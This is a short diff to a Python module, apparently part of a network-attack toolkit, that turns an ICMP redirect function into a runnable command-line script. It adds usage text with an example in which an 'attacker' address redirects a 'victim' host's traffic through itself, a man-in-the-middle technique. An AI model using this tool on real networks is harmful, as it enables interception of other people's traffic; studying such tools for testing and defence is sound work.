@@ -72,10 +72,24 @@ def redirect(rawsock, target: str, attacker: str, victim: str, gateway: str):
 	rawsock.sendto(redirect_message, (victim, 0))
 
 
-def main(arvg):
-	if len(arvg) < 4:
+if __name__ == "__main__":
+	"""
+	ICMP Redirect
+
+	Usage:
+		python3 -m agave.icmp.redirect <target> <attacker> <victim> <gateway>
+
+	Example:
+		python3 -m agave.icmp.redirect 8.8.8.8 192.168.0.2 192.168.0.3 192.168.0.1
+	
+	"""
+	import sys
+
+
+	if len(sys.argv) < 5:
 		print("Too few parameters")
 	else:
 		rawsocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
 		rawsocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-		redirect(rawsocket, *tuple(arvg))
+		redirect(rawsocket, *tuple(sys.argv[1:]))
+
